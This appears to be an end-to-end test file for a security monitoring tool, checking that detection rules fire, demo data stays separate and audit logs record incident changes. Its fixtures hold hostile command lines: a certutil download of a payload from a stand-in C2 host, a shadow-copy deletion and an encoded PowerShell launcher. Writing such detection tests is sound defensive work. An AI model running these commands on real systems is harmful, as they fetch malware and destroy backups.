"""Tier 3: Cross-Feature Combinations (Correlated Multi-Module Workflows).

Covers:
- Process spawning combined with suspicious outbound socket connection triggering correlated incident
- FIM file modification combined with persistence mechanism creation triggering multiple correlated alerts
- Demo mode toggle ensuring strict isolation between live and simulated telemetry
- Incident status transitions synchronously producing immutable audit log records
- Dynamic detection rule toggling immediately altering live incident triggering behavior
"""

from __future__ import annotations

from tests.e2e.harness.base import AgniE2ETestCase
from tests.e2e.harness.fixtures import (
    make_fim_event,
    make_network_event,
    make_persistence_event,
    make_process_event,
)


class TestTier3CrossFeatureCombinations(AgniE2ETestCase):
    """Integration of multiple security modules and telemetry correlation."""

    def test_01_process_spawn_and_suspicious_socket_correlation(self) -> None:
        """Process execution followed by suspicious socket connection creates correlated alerts."""
        target_pid = 7712

        # 1. Spawn LOLBin certutil.exe
        proc_ev = make_process_event(
            name="certutil.exe",
            cmdline="certutil.exe -urlcache -split -f http://evil-c2.net/stage2.exe",
            pid=target_pid,
        )
        p_resp = self.client.ingest_event(proc_ev)
        self.assertTrue(p_resp.is_success, f"Failed to ingest process event: {p_resp.text}")

        # 2. Open outbound connection on reverse shell port 4444 from same PID
        net_ev = make_network_event(
            remote_ip="198.51.100.55",
            remote_port=4444,
            pid=target_pid,
            process_name="certutil.exe",
        )
        n_resp = self.client.ingest_event(net_ev)
        self.assertTrue(n_resp.is_success, f"Failed to ingest network event: {n_resp.text}")

        # 3. Verify incidents generated
        inc_resp = self.client.get_incidents()
        self.assertTrue(inc_resp.is_success)
        incidents = inc_resp.data

        # Should match AGNI-R-PROC-002 (certutil) and AGNI-R-NET-001 (port 4444)
        proc_inc = next((i for i in incidents if i["rule_id"] == "AGNI-R-PROC-002"), None)
        net_inc = next((i for i in incidents if i["rule_id"] == "AGNI-R-NET-001"), None)

        self.assertIsNotNone(proc_inc, "Certutil LOLBin incident must be triggered")
        self.assertIsNotNone(net_inc, "C2 reverse shell port incident must be triggered")

    def test_02_fim_modification_and_persistence_correlation(self) -> None:
        """FIM host file modification and Registry Run key persistence trigger distinct alerts."""
        # 1. FIM System Hosts File modification
        fim_ev = make_fim_event(
            file_path=r"C:\Windows\System32\drivers\etc\hosts",
            action="modified",
        )
        f_resp = self.client.ingest_event(fim_ev)
        self.assertTrue(f_resp.is_success)

        # 2. Persistence Registry Run Key added
        pers_ev = make_persistence_event(
            target_identifier=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate",
            action="created",
        )
        p_resp = self.client.ingest_event(pers_ev)
        self.assertTrue(p_resp.is_success)

        # 3. Verify both alerts exist in Incident store
        inc_resp = self.client.get_incidents()
        self.assertTrue(inc_resp.is_success)
        incidents = inc_resp.data

        fim_inc = next((i for i in incidents if i["rule_id"] == "AGNI-R-FIM-001"), None)
        pers_inc = next((i for i in incidents if i["rule_id"] == "AGNI-R-PERS-001"), None)

        self.assertIsNotNone(fim_inc, "Hosts file FIM incident must be triggered")
        self.assertIsNotNone(pers_inc, "Registry persistence incident must be triggered")
        self.assertEqual(fim_inc["severity"], "High")
        self.assertEqual(pers_inc["severity"], "High")

    def test_03_demo_mode_data_isolation_from_live_telemetry(self) -> None:
        """Live events ingested while demo mode is active remain strictly segregated."""
        # 1. Ingest clean live event
        live_ev = make_process_event(name="notepad.exe", cmdline="notepad.exe doc.txt", pid=1001, is_sample=False)
        self.client.ingest_event(live_ev)

        # 2. Seed demo dataset (synthetic APT)
        self.client.seed_demo_data()

        # 3. Query with include_sample=False (Default Live SOC View)
        live_only_resp = self.client.get_events(include_sample=False)
        self.assertTrue(live_only_resp.is_success)
        live_events = live_only_resp.data
        self.assertTrue(all(not e.get("is_sample", False) for e in live_events), "Live query must contain NO sample data")
        self.assertTrue(any(e.get("actor", {}).get("name") == "notepad.exe" for e in live_events))

        # 4. Query with include_sample=True (Demo / Mixed View)
        mixed_resp = self.client.get_events(include_sample=True)
        self.assertTrue(mixed_resp.is_success)
        mixed_events = mixed_resp.data
        sample_count = sum(1 for e in mixed_events if e.get("is_sample", False))
        self.assertGreater(sample_count, 0, "Mixed query must include demo events")

        # 5. Clear demo data and verify live event was NOT deleted
        self.client.clear_demo_data()
        post_clear_resp = self.client.get_events(include_sample=False)
        self.assertTrue(any(e.get("actor", {}).get("name") == "notepad.exe" for e in post_clear_resp.data), "Live data must survive demo clear")

    def test_04_incident_triage_audit_log_correlation(self) -> None:
        """Every incident status transition creates an immutable audit trail entry."""
        ev = make_process_event(name="vssadmin.exe", cmdline="vssadmin.exe delete shadows /all /quiet", pid=8899)
        self.client.ingest_event(ev)

        inc_resp = self.client.get_incidents()
        self.assertTrue(inc_resp.is_success)
        target_inc = next((i for i in inc_resp.data if i["rule_id"] == "AGNI-R-PROC-003"), None)
        self.assertIsNotNone(target_inc)
        inc_id = target_inc["id"]

        # Status transition to 'In Progress'
        self.client.update_incident_status(inc_id, status="In Progress", note="Escalated to Tier 2 SOC Analyst")

        # Check Audit Trail
        audit_resp = self.client.get_audit_logs()
        self.assertTrue(audit_resp.is_success)
        audit_logs = audit_resp.data

        status_audit = next(
            (
                a for a in audit_logs
                if a.get("action") == "INCIDENT_STATUS_CHANGE" and a.get("target_resource") == f"incident:{inc_id}"
            ),
            None,
        )
        self.assertIsNotNone(status_audit, "Audit log must contain record of incident status change")
        self.assertEqual(status_audit.get("details", {}).get("to"), "In Progress")

    def test_05_rule_disabling_suppresses_incident_creation(self) -> None:
        """Disabling a detection rule prevents it from generating alerts on subsequent matching events."""
        rule_id = "AGNI-R-PROC-001"

        # 1. Disable Rule
        self.client.toggle_rule(rule_id, enabled=False)

        # 2. Ingest matching event
        ev = make_process_event(name="powershell.exe", cmdline="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", pid=6655)
        self.client.ingest_event(ev)

        # 3. Assert NO incident was created for this PID
        inc_resp = self.client.get_incidents()
        self.assertTrue(inc_resp.is_success)
        pid_inc = next((i for i in inc_resp.data if "6655" in i.get("entity_key", "")), None)
        self.assertIsNone(pid_inc, "Disabled rule must NOT generate incident")

        # 4. Re-enable Rule
        self.client.toggle_rule(rule_id, enabled=True)

        # 5. Ingest matching event again
        ev2 = make_process_event(name="powershell.exe", cmdline="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", pid=6656)
        self.client.ingest_event(ev2)

        # 6. Assert incident is now created
        inc_resp2 = self.client.get_incidents()
        pid_inc2 = next((i for i in inc_resp2.data if "6656" in i.get("entity_key", "")), None)
        self.assertIsNotNone(pid_inc2, "Re-enabled rule must resume generating incidents")
